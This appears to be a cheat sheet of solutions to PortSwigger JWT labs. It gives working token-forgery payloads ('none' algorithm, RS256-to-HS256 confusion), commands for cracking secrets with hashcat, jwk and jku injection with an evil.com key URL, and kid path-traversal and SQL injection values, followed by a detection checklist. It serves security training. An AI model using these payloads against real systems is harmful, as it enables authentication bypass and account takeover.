# JWT Attack Techniques

## PortSwigger Lab Solutions

### Lab 1: JWT authentication bypass via unverified signature
**Approach**: Server doesn't verify signature
**Steps**:
1. Decode JWT: base64(header).base64(payload).base64(signature)
2. Change payload: {"sub":"wiener"} → {"sub":"administrator"}
3. Re-encode (keep or remove signature)
4. Send modified token

### Lab 2: JWT authentication bypass via flawed signature verification  
**Approach**: Algorithm confusion or none algorithm
**Payload header**: `{"alg":"none","typ":"JWT"}`
**Encoded**: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

### Lab 3: JWT authentication bypass via weak signing key
**Approach**: Crack the secret key
```
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
# or
john --wordlist=wordlist.txt jwt.txt
```

### Lab 4: JWT authentication bypass via jwk header injection
**Approach**: Inject attacker's public key via jwk header
```
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "attacker_public_key_modulus"
  }
}
```

### Lab 5: JWT authentication bypass via jku header injection
**Approach**: Point jku to attacker-controlled URL
```
{
  "alg": "RS256",
  "jku": "https://evil.com/jwks.json"
}
```

### Lab 6: JWT authentication bypass via kid header path traversal
**Approach**: Path traversal in kid header to use known file
```
{
  "alg": "HS256",
  "kid": "../../dev/null"
}
# Sign with empty string (dev/null content)
```

## Common JWT Attacks

### Algorithm None
```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "administrator", "role": "admin"}

token = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
token += '.'  # Empty signature
print(token)
```

### Algorithm Confusion (RS256 → HS256)
```python
import jwt

# Use public key as HMAC secret
public_key = open('public.pem').read()
token = jwt.encode({"sub": "administrator"}, public_key, algorithm='HS256')
print(token)
```

### Crack Weak Secret
```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# Using jwt_tool
python3 jwt_tool.py <token> -C -d wordlist.txt
```

### kid Injection
```
# Set kid to SQL injection point
{"kid": "1' OR '1'='1"}

# Set kid to path traversal
{"kid": "/dev/null"}
# Sign with empty string
```

## Detection Checklist
- [ ] JWT signature not verified
- [ ] "none" algorithm accepted
- [ ] Weak signing key (crackable)
- [ ] jwk/jku header allows key injection
- [ ] kid header vulnerable to injection/traversal
- [ ] No expiration time (exp claim)
- [ ] Sensitive data in payload
